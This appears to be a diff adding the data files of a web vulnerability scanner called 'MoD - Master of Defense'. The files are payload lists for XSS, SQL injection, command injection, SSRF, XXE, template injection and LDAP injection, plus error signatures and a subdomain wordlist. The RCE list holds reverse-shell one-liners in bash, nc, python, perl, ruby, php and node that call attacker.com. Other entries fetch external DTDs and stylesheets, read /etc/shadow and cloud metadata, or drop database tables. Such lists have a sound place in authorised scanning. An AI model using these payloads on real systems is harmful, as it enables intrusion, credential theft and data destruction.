@@ -1,0 +1,1241 @@
+================================================================================
+                    MoD - MASTER OF DEFENSE v3.0
+                    DATA & CONFIG FILES COMPLETE CODE (Files 52-63)
+                    فایل‌های داده و تنظیمات - خط به خط
+================================================================================
+
+================================================================================
+FILE 52: data/xss_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<iframe src=javascript:alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<input autofocus onfocus=alert('XSS')>",
+    "<select autofocus onfocus=alert('XSS')>",
+    "<textarea autofocus onfocus=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>",
+    "<details ontoggle=alert('XSS')>",
+    "<video src=x onerror=alert('XSS')>",
+    "<audio src=x onerror=alert('XSS')>",
+    "<source src=x onerror=alert('XSS')>",
+    "<track src=x onerror=alert('XSS')>",
+    "<picture><source srcset=x onerror=alert('XSS')></picture>",
+    "<object data=x onerror=alert('XSS')>",
+    "<embed src=x onerror=alert('XSS')>",
+    "<form onfocus=alert('XSS')>",
+    "<keygen onfocus=alert('XSS')>",
+    "<meter onmouseover=alert('XSS')>",
+    "<progress onmouseover=alert('XSS')>",
+    "<time onmouseover=alert('XSS')>",
+    "<math onload=alert('XSS')>",
+    "<style onload=alert('XSS')>",
+    "<link onload=alert('XSS')>",
+    "<script src=x onerror=alert('XSS')>",
+    "<img src=x alt=xss title=xss onerror=alert('XSS')>",
+    "<svg><image xlink:href=x onerror=alert('XSS')></image></svg>",
+    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+    "<svg><set onbegin=alert('XSS') attributeName=x to=y>",
+    "<svg><animateMotion onbegin=alert('XSS')>",
+    "<svg><animateTransform onbegin=alert('XSS')>",
+    "<svg><mpath onbegin=alert('XSS')>",
+    "<svg><foreignObject onload=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "<path d=x onfocus=alert('XSS')>",
+    "<rect onload=alert('XSS')>",
+    "<circle onload=alert('XSS')>",
+    "<ellipse onload=alert('XSS')>",
+    "<line onload=alert('XSS')>",
+    "<polyline onload=alert('XSS')>",
+    "<polygon onload=alert('XSS')>",
+    "<text onload=alert('XSS')>",
+    "<tspan onload=alert('XSS')>",
+    "<defs onload=alert('XSS')>",
+    "<symbol onload=alert('XSS')>",
+    "<use onload=alert('XSS')>",
+    "<marker onload=alert('XSS')>",
+    "<mask onload=alert('XSS')>",
+    "<image onload=alert('XSS')>",
+    "<switch onload=alert('XSS')>",
+    "<style>@import'http://attacker.com/xss.css';</style>",
+    "<link rel=stylesheet href=http://attacker.com/xss.css>",
+    "<style>*{background:url('http://attacker.com/xss.png')}</style>",
+    "<style>body{background-image:url('javascript:alert(\"XSS\")')}</style>",
+    "<style>*{behavior:url(http://attacker.com/xss.htc)}</style>",
+    "<style>@import url(http://attacker.com/xss.css);</style>",
+    "<link rel=import href=http://attacker.com/xss.html>",
+    "<base href=http://attacker.com/>",
+    "<meta http-equiv=refresh content=0;url=http://attacker.com/>",
+    "'-alert('XSS')-'",
+    "\\\"-alert('XSS')-\\\"",
+    "<svg/onload=alert('XSS')>",
+    "<img/src=x/onerror=alert('XSS')>",
+    "<script/src=x/onerror=alert('XSS')>",
+    "<iframe/src=javascript:alert('XSS')>",
+    "<body/onload=alert('XSS')>",
+    "<img src=x:alert('XSS')>",
+    "<img src='x'onerror=alert('XSS')>",
+    "<svg><script>alert('XSS')</script></svg>"
+  ]
+}
+
+================================================================================
+FILE 53: data/sql_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR '1'='1'--",
+    "admin' --",
+    "admin' #",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+    "1' AND '1'='1",
+    "1' AND 1=1--",
+    "1' UNION SELECT @@version--",
+    "1' UNION SELECT database()--",
+    "1' UNION SELECT user()--",
+    "1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
+    "1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns--",
+    "1' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password)) FROM users--",
+    "' OR 'a'='a",
+    "' OR 'x'='x",
+    "' OR 'y'='y",
+    "' OR 'z'='z",
+    "1' OR '1' = '1",
+    "1' OR '1'='1",
+    "admin' OR '1'='1",
+    "admin' OR 1=1--",
+    "' OR '1' LIKE '1",
+    "' OR 1 LIKE 1",
+    "' OR 'a' LIKE 'a",
+    "' LIKE '%",
+    "' LIKE '%' --",
+    "' LIKE '%' #",
+    "' LIKE '%' /*",
+    "admin' LIKE '%",
+    "admin' LIKE '%' --",
+    "1' UNION ALL SELECT 1--",
+    "1' UNION ALL SELECT 1,2--",
+    "1' UNION ALL SELECT 1,2,3--",
+    "' UNION ALL SELECT 1,2,3,4,5--",
+    "1'; DROP TABLE users--",
+    "1'; DROP TABLE admin--",
+    "1'; DELETE FROM users--",
+    "1'; DELETE FROM admin--",
+    "1'; UPDATE users SET password='hacked'--",
+    "1'; INSERT INTO users VALUES('hacker','pass')--",
+    "1' AND SLEEP(5)--",
+    "1' AND BENCHMARK(10000000,MD5('test'))--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "1' UNION SELECT SLEEP(5)--",
+    "1' UNION SELECT IF(1=1,SLEEP(5),0)--",
+    "1' AND IF(1=1,SLEEP(5),0)--",
+    "1' OR IF(1=1,SLEEP(5),0)--",
+    "' AND '1'='1",
+    "' AND 1=1",
+    "' AND 1=1--",
+    "' AND '1'='2",
+    "' AND 1=2",
+    "' AND (1=1)",
+    "' AND (1=2)",
+    "') AND '1'='1",
+    "') AND 1=1",
+    "') AND '1'='2",
+    "') AND 1=2",
+    "') OR '1'='1",
+    "') OR 1=1",
+    "')) AND '1'='1",
+    "')) AND 1=1",
+    "')) OR '1'='1",
+    "')) OR 1=1",
+    "') UNION SELECT NULL--",
+    "')) UNION SELECT NULL--",
+    "' UNION SELECT NULL,USER()--",
+    "' UNION SELECT NULL,DATABASE()--",
+    "' UNION SELECT NULL,VERSION()--",
+    "' UNION SELECT NULL,@@datadir--",
+    "' UNION SELECT NULL,@@version_compile_os--",
+    "' UNION SELECT table_name,column_name FROM information_schema.columns--",
+    "1' AND extractvalue(rand(),concat(0x3a,version()))--",
+    "1' AND updatexml(rand(),concat(0x3a,version()),0)--",
+    "1' AND (SELECT COUNT(*) FROM information_schema.tables)--",
+    "1' AND (SELECT COUNT(*) FROM information_schema.columns)--"
+  ]
+}
+
+================================================================================
+FILE 54: data/rce_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "; ls -la",
+    "| ls -la",
+    "& ls -la",
+    "`ls -la`",
+    "$(ls -la)",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "& cat /etc/passwd",
+    "`cat /etc/passwd`",
+    "$(cat /etc/passwd)",
+    "; whoami",
+    "| whoami",
+    "& whoami",
+    "`whoami`",
+    "$(whoami)",
+    "; id",
+    "| id",
+    "& id",
+    "`id`",
+    "$(id)",
+    "; pwd",
+    "| pwd",
+    "& pwd",
+    "`pwd`",
+    "$(pwd)",
+    "; uname -a",
+    "| uname -a",
+    "& uname -a",
+    "`uname -a`",
+    "$(uname -a)",
+    "; cat /etc/shadow",
+    "| cat /etc/shadow",
+    "& cat /etc/shadow",
+    "`cat /etc/shadow`",
+    "$(cat /etc/shadow)",
+    "; cat /etc/hosts",
+    "| cat /etc/hosts",
+    "& cat /etc/hosts",
+    "`cat /etc/hosts`",
+    "$(cat /etc/hosts)",
+    "; cat /proc/version",
+    "| cat /proc/version",
+    "& cat /proc/version",
+    "`cat /proc/version`",
+    "$(cat /proc/version)",
+    "; ls -la /root",
+    "| ls -la /root",
+    "& ls -la /root",
+    "`ls -la /root`",
+    "$(ls -la /root)",
+    "; ls -la /home",
+    "| ls -la /home",
+    "& ls -la /home",
+    "`ls -la /home`",
+    "$(ls -la /home)",
+    "; tar -czf /tmp/backup.tar.gz /",
+    "| tar -czf /tmp/backup.tar.gz /",
+    "&& cat /etc/passwd",
+    "|| cat /etc/passwd",
+    "; curl http://attacker.com",
+    "| curl http://attacker.com",
+    "&curl http://attacker.com",
+    "; wget http://attacker.com",
+    "| wget http://attacker.com",
+    "&wget http://attacker.com",
+    "; nc -e /bin/sh attacker.com 4444",
+    "| nc -e /bin/sh attacker.com 4444",
+    "& nc -e /bin/sh attacker.com 4444",
+    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    "& bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'",
+    "; ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",4444);exec(\"/bin/sh -i\")<&c.to_i >&c.to_i'",
+    "; php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "; node -e 'require(\"child_process\").exec(\"/bin/sh\", {stdio: [require(\"net\").createConnection(4444,\"attacker.com\"), process.stdout, process.stderr]})'",
+    "; find / -type f -name sensitive",
+    "| find / -type f -name sensitive",
+    "& find / -type f -name sensitive",
+    "; grep -r password /",
+    "| grep -r password /",
+    "& grep -r password /"
+  ]
+}
+
+================================================================================
+FILE 55: data/command_injection_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "; sleep 5",
+    "| sleep 5",
+    "& sleep 5",
+    "`sleep 5`",
+    "$(sleep 5)",
+    "; ping -c 5 127.0.0.1",
+    "| ping -c 5 127.0.0.1",
+    "& ping -c 5 127.0.0.1",
+    "`ping -c 5 127.0.0.1`",
+    "$(ping -c 5 127.0.0.1)",
+    "; ping -c 10 localhost",
+    "| ping -c 10 localhost",
+    "& ping -c 10 localhost",
+    "`ping -c 10 localhost`",
+    "$(ping -c 10 localhost)",
+    "; time sleep 3",
+    "| time sleep 3",
+    "& time sleep 3",
+    "`time sleep 3`",
+    "$(time sleep 3)",
+    "; echo test",
+    "| echo test",
+    "& echo test",
+    "`echo test`",
+    "$(echo test)",
+    "; date",
+    "| date",
+    "& date",
+    "`date`",
+    "$(date)",
+    "; whoami",
+    "| whoami",
+    "& whoami",
+    "`whoami`",
+    "$(whoami)",
+    "; touch /tmp/test",
+    "| touch /tmp/test",
+    "& touch /tmp/test",
+    "`touch /tmp/test`",
+    "$(touch /tmp/test)",
+    "; mkdir /tmp/testdir",
+    "| mkdir /tmp/testdir",
+    "& mkdir /tmp/testdir",
+    "`mkdir /tmp/testdir`",
+    "$(mkdir /tmp/testdir)",
+    "; rm /tmp/test",
+    "| rm /tmp/test",
+    "& rm /tmp/test",
+    "`rm /tmp/test`",
+    "$(rm /tmp/test)",
+    "; cal",
+    "| cal",
+    "& cal",
+    "`cal`",
+    "$(cal)",
+    "; uptime",
+    "| uptime",
+    "& uptime",
+    "`uptime`",
+    "$(uptime)",
+    "; df -h",
+    "| df -h",
+    "& df -h",
+    "`df -h`",
+    "$(df -h)",
+    "; du -sh /*",
+    "| du -sh /*",
+    "& du -sh /*",
+    "`du -sh /*`",
+    "$(du -sh /*)",
+    "; ps aux",
+    "| ps aux",
+    "& ps aux",
+    "`ps aux`",
+    "$(ps aux)",
+    "; netstat -an",
+    "| netstat -an",
+    "& netstat -an",
+    "`netstat -an`",
+    "$(netstat -an)",
+    "; ifconfig",
+    "| ifconfig",
+    "& ifconfig",
+    "`ifconfig`",
+    "$(ifconfig)"
+  ]
+}
+
+================================================================================
+FILE 56: data/ssrf_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://169.254.169.254",
+    "http://0.0.0.0",
+    "http://[::1]",
+    "http://localhost:8080",
+    "http://127.0.0.1:22",
+    "http://192.168.1.1",
+    "http://192.168.0.1",
+    "http://10.0.0.1",
+    "http://10.0.0.0",
+    "http://10.255.255.255",
+    "http://172.16.0.0",
+    "http://172.31.255.255",
+    "http://192.168.0.0",
+    "http://192.168.255.255",
+    "file:///etc/passwd",
+    "file:///etc/shadow",
+    "file:///etc/hosts",
+    "file:///proc/version",
+    "file:///proc/self/environ",
+    "file:///proc/self/cwd",
+    "file:///c:/windows/win.ini",
+    "file:///c:/windows/system32/config/sam",
+    "file:///c:/boot.ini",
+    "dict://localhost:11211",
+    "dict://127.0.0.1:11211",
+    "gopher://localhost",
+    "gopher://127.0.0.1",
+    "tftp://localhost",
+    "tftp://127.0.0.1",
+    "ldap://localhost",
+    "ldap://127.0.0.1",
+    "sftp://localhost",
+    "sftp://127.0.0.1",
+    "smtp://localhost",
+    "smtp://127.0.0.1",
+    "ftp://localhost",
+    "ftp://127.0.0.1",
+    "http://localhost:3306",
+    "http://127.0.0.1:3306",
+    "http://localhost:5432",
+    "http://127.0.0.1:5432",
+    "http://localhost:6379",
+    "http://127.0.0.1:6379",
+    "http://localhost:27017",
+    "http://127.0.0.1:27017",
+    "http://localhost:9200",
+    "http://127.0.0.1:9200",
+    "http://localhost:8009",
+    "http://127.0.0.1:8009",
+    "http://localhost:8080",
+    "http://127.0.0.1:8080",
+    "http://localhost:8081",
+    "http://127.0.0.1:8081",
+    "http://localhost:8888",
+    "http://127.0.0.1:8888",
+    "http://localhost:9000",
+    "http://127.0.0.1:9000",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/user-data/",
+    "http://169.254.169.254/latest/api/token",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/v1/",
+    "http://127.0.0.1:169.254.169.254",
+    "http://1.1.1.1",
+    "http://8.8.8.8",
+    "http://admin:admin@localhost:8080",
+    "http://admin:admin@127.0.0.1:8080",
+    "http://localhost@127.0.0.1",
+    "http://127.0.0.1@localhost",
+    "http://localhost%00@attacker.com",
+    "http://127.0.0.1%00@attacker.com"
+  ]
+}
+
+================================================================================
+FILE 57: data/xxe_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>",
+    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"> %xxe;]>",
+    "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain,Hello\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"rar:http://attacker.com/evil.rar!/\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ogg:http://attacker.com/evil.ogg\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"phar:http://attacker.com/evil.phar/\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]>",
+    "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]>",
+    "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?%xxe;'>\"> %all;]>",
+    "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo></foo>",
+    "<!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><foo></foo>"
+  ]
+}
+
+================================================================================
+FILE 58: data/ssti_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "{{7*7}}",
+    "{{7*'7'}}",
+    "{{ 7 * 7 }}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "<%= 7 * 7 %>",
+    "#set($x=7*7)$x",
+    "#set($x=7*7) $x",
+    "#{7*7}",
+    "[[${{7*7}}]]",
+    "[[${7*7}]]",
+    "{{{7*7}}}",
+    "{{7*7}}",
+    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "{{config.items()}}",
+    "{{request.application.__globals__['current_app'].config}}",
+    "{{request.__init__.__globals__['os'].popen('id').read()}}",
+    "{{ self.__init__.__globals__['os'].popen('id').read() }}",
+    "{{ ''.__class__.__mro__[2].__subclasses__() }}",
+    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+    "${7*7}",
+    "${{7*7}}",
+    "${InjectionTest}",
+    "${${7*7}}",
+    "${#{7*7}}",
+    "<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }",
+    "<#assign value='freemarker.template.utility.ObjectConstructor'?new()> ${value('java.lang.ProcessBuilder','id').start()}",
+    "[#assign ex='freemarker.template.utility.Execute'?new()] ${ex('id')}",
+    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+    "*{7*7}*",
+    "{@java.lang.Runtime@getRuntime().exec('id')}",
+    "%{7*7}%",
+    "#evaluate('7*7')",
+    "#set($a='freemarker.template.utility.Execute'?new()) $a('id')",
+    "#{@java.lang.Runtime@getRuntime().exec('id')}",
+    "[[${7*7}]]",
+    "{{7*7}}",
+    "<?php echo 7*7; ?>",
+    "<? echo 7*7; ?>",
+    "<%@ page import='java.io.*' %><% Runtime.getRuntime().exec(\"id\"); %>",
+    "<%= java.lang.Runtime.getRuntime().exec(\"id\") %>",
+    "<!-- TEMPLATE INJECTION TEST -->",
+    "{{request.environ}}",
+    "{{get_flashed_messages()}}",
+    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+    "{{lipsum.__init__.__globals__.os.popen('id').read()}}"
+  ]
+}
+
+================================================================================
+FILE 59: data/ldap_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "*",
+    "*)(|(mail=*",
+    "admin)(|(password=*",
+    "*)(uid=*",
+    "admin*)(|(uid=*",
+    "*)(objectClass=*",
+    "*)(|(cn=*",
+    "*)(|(sn=*",
+    "*)(|(givenName=*",
+    "*)(|(mail=*",
+    "*)(|(uid=*",
+    "*)(|(ou=*",
+    "*)(|(o=*",
+    "*)(|(c=*",
+    "*)(|(st=*",
+    "*)(|(l=*",
+    "*)(|(userPassword=*",
+    "*)(|(loginShell=*",
+    "*)(|(uidNumber=*",
+    "*)(|(gidNumber=*",
+    "admin*",
+    "admin*))(|(uid=*",
+    "admin*)(|(password=*",
+    "admin*)(|(cn=*",
+    "*))(&(uid=*",
+    "*))(&(mail=*",
+    "*))(&(password=*",
+    "*))(&(|(uid=*",
+    "*))(|(mail=*))(&(uid=*",
+    "*))(&(mail=*",
+    "admin))(|(uid=*",
+    "admin*)(|(mail=*",
+    "*)(|(userPassword=*",
+    "*))(&(userPassword=*",
+    "admin)(&(|(mail=*",
+    "admin))(&(cn=*",
+    "*)(mail=admin@example.com",
+    "admin)(|(mail=*",
+    "admin)(|(uid=*",
+    "admin)(|(password=*",
+    "*))(|(uid=*",
+    "*))(|(mail=*",
+    "*))(|(password=*",
+    "admin))(mail=*",
+    "admin*)(|(|(uid=*",
+    "*)(|(|(uid=*",
+    "*)(uid=admin*",
+    "*)(mail=*",
+    "*)(cn=admin*"
+  ]
+}
+
+================================================================================
+FILE 60: data/error_signatures.json
+================================================================================
+
+{
+  "SQL": [
+    "sql syntax",
+    "mysql_fetch",
+    "syntax error",
+    "unclosed quotation",
+    "quoted string not properly terminated",
+    "ORA-01756",
+    "SQL command not properly ended",
+    "PostgreSQL query failed",
+    "sqlite3.OperationalError",
+    "MySQL Error",
+    "SQL Error",
+    "Database Error",
+    "ODBC Error",
+    "Microsoft SQL Server",
+    "Microsoft Access Database Engine",
+    "Parse error",
+    "Warning: mysql",
+    "Warning: mysqli",
+    "Warning: PDO",
+    "Fatal error",
+    "Column count doesn't match",
+    "Unknown column",
+    "Column not found",
+    "Table doesn't exist",
+    "Unknown table",
+    "Table not found",
+    "Access denied",
+    "Permission denied",
+    "ERROR 1045",
+    "ERROR 1064",
+    "ERROR 1130",
+    "PL/SQL",
+    "ORA-",
+    "mssql_query",
+    "mssql_error"
+  ],
+  "XSS": [
+    "<script>",
+    "alert(",
+    "onerror=",
+    "onload=",
+    "javascript:",
+    "data:text/html",
+    "vbscript:",
+    "iframe",
+    "object",
+    "embed",
+    "applet",
+    "meta",
+    "link",
+    "base",
+    "form",
+    "input",
+    "img",
+    "svg",
+    "canvas",
+    "video",
+    "audio",
+    "source",
+    "track",
+    "picture",
+    "object",
+    "embed",
+    "applet",
+    "style",
+    "script",
+    "onclick",
+    "onmouseover",
+    "onmouseout",
+    "onfocus",
+    "onblur",
+    "onchange",
+    "onsubmit"
+  ],
+  "RCE": [
+    "root:",
+    "/bin/bash",
+    "/bin/sh",
+    "uid=",
+    "gid=",
+    "groups=",
+    "total ",
+    "drwx",
+    "-rw-",
+    "-rwx",
+    "lrwx",
+    "crwx",
+    "brwx",
+    "uid=0",
+    "uid=1000",
+    "Windows",
+    "WINNT",
+    "SYSTEM",
+    "Administrator",
+    "C:\\",
+    "D:\\",
+    "E:\\",
+    "cmd.exe",
+    "powershell",
+    "whoami",
+    "hostname"
+  ],
+  "CommandInjection": [
+    "total ",
+    "drwx",
+    "-rw-",
+    "root root",
+    "bin bin",
+    "daemon daemon",
+    "adm adm",
+    "lp lp",
+    "sync sync",
+    "shutdown shutdown",
+    "halt halt",
+    "mail mail",
+    "news news",
+    "uucp uucp",
+    "operator operator",
+    "games games",
+    "gopher gopher",
+    "nobody nobody"
+  ],
+  "SSRF": [
+    "Connection refused",
+    "Connection timed out",
+    "No route to host",
+    "Internal Server Error",
+    "Bad Gateway",
+    "Service Unavailable",
+    "Gateway Timeout",
+    "HTTP Error",
+    "502 Bad Gateway",
+    "503 Service Unavailable",
+    "504 Gateway Timeout",
+    "refused",
+    "timed out",
+    "unreachable",
+    "unavailable"
+  ],
+  "XXE": [
+    "XML",
+    "DOCTYPE",
+    "ENTITY",
+    "SYSTEM",
+    "PUBLIC",
+    "DTD",
+    "XML parsing error",
+    "XML syntax error",
+    "DOCTYPE not allowed",
+    "Entity not allowed",
+    "External entity disabled"
+  ],
+  "FileUpload": [
+    "upload",
+    "file",
+    "success",
+    "completed",
+    "saved",
+    "stored",
+    "failed",
+    "error",
+    "invalid",
+    "rejected",
+    "not allowed",
+    "extension not allowed"
+  ]
+}
+
+================================================================================
+FILE 61: data/subdomain_wordlist.txt
+================================================================================
+
+www
+mail
+ftp
+admin
+test
+dev
+staging
+api
+app
+blog
+shop
+store
+portal
+dashboard
+cpanel
+webmail
+smtp
+pop
+imap
+ns1
+ns2
+ns3
+ns4
+vpn
+remote
+secure
+login
+auth
+beta
+demo
+old
+new
+mobile
+m
+wap
+static
+media
+assets
+cdn
+images
+img
+files
+docs
+support
+help
+backup
+cache
+temp
+tmp
+log
+logs
+archive
+archives
+download
+downloads
+upload
+uploads
+version
+versions
+release
+releases
+dev
+development
+staging
+production
+test
+testing
+qa
+quality
+release
+prod
+production
+dev
+develop
+feature
+features
+hotfix
+release
+experimental
+beta
+alpha
+public
+private
+internal
+external
+local
+localhost
+127
+0
+1
+office
+work
+company
+corporate
+enterprise
+business
+financial
+accounts
+billing
+payment
+invoice
+receipt
+order
+orders
+ecommerce
+shop
+cart
+checkout
+customer
+customers
+user
+users
+member
+members
+profile
+profiles
+account
+accounts
+settings
+preferences
+config
+configuration
+admin
+administrator
+moderator
+staff
+employee
+employees
+hr
+human
+resources
+payroll
+recruitment
+recruitment
+career
+careers
+jobs
+job
+apply
+application
+resume
+cv
+training
+training
+onboarding
+system
+systems
+database
+db
+backup
+backup
+archive
+restore
+recovery
+security
+ssl
+certificate
+certificates
+cert
+certs
+crypto
+encryption
+vpn
+proxy
+firewall
+network
+subnet
+router
+gateway
+dns
+mail
+email
+webmail
+calendar
+contacts
+tasks
+notes
+documents
+document
+files
+file
+folder
+folders
+project
+projects
+task
+tasks
+issue
+issues
+bug
+bugs
+feature
+features
+tracker
+tracking
+wiki
+knowledge
+base
+documentation
+docs
+readme
+license
+license
+author
+authors
+contributor
+contributors
+sponsor
+sponsors
+partner
+partners
+alliance
+alliances
+affiliate
+affiliates
+referral
+referrals
+commission
+commissions
+reseller
+resellers
+distributor
+distributors
+vendor
+vendors
+supplier
+suppliers
+inventory
+stock
+warehouse
+warehouse
+shipping
+logistics
+tracking
+package
+packages
+delivery
+deliveries
+customer
+customers
+support
+support
+ticket
+tickets
+issue
+issues
+complaint
+complaints
+feedback
+feedback
+survey
+surveys
+poll
+polls
+review
+reviews
+rating
+ratings
+recommend
+recommendation
+recommendations
+referral
+referrals
+bonus
+bonuses
+rewards
+reward
+loyalty
+points
+coupon
+coupons
+discount
+discounts
+promotion
+promotions
+offer
+offers
+sale
+sales
+clearance
+clearance
+bargain
+bargains
+deal
+deals
+special
+specials
+featured
+featured
+popular
+trending
+new
+newest
+latest
+recent
+top
+best
+bestseller
+bestsellers
+rated
+rating
+recommended
+recommended
+similar
+related
+category
+categories
+subcategory
+subcategories
+section
+sections
+department
+departments
+division
+divisions
+branch
+branches
+office
+offices
+location
+locations
+store
+stores
+outlet
+outlets
+warehouse
+warehouses
+distribution
+distribution
+center
+centers
+
+================================================================================
+FILE 62: data/api_payloads.json
+================================================================================
+
+{
+  "payloads": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR '1'='1'--",
+    "admin' --",
+    "'; DROP TABLE users--",
+    "${jndi:ldap://attacker.com}",
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "; ls -la",
+    "| cat /etc/passwd",
+    "& whoami",
+    "`id`",
+    "$(whoami)",
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://169.254.169.254",
+    "file:///etc/passwd",
+    "..\\..\\..\\..\\etc\\passwd",
+    "../../../../etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "#set($x=7*7)$x",
+    "admin",
+    "admin' OR 'a'='a",
+    "admin' OR 1=1--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "* OR 1=1",
+    "*)",
+    "*))(|(uid=*",
+    "admin*",
+    "*",
+    ";",
+    "|",
+    "&",
+    "`",
+    "$",
+    "%",
+    "<<",
+    ">>",
+    "^",
+    "~",
+    "!",
+    "?",
+    "[",
+    "]",
+    "{",
+    "}",
+    "\\",
+    "\""
+  ]
+}
+
+================================================================================
+FILE 63: .env.example
+================================================================================
+
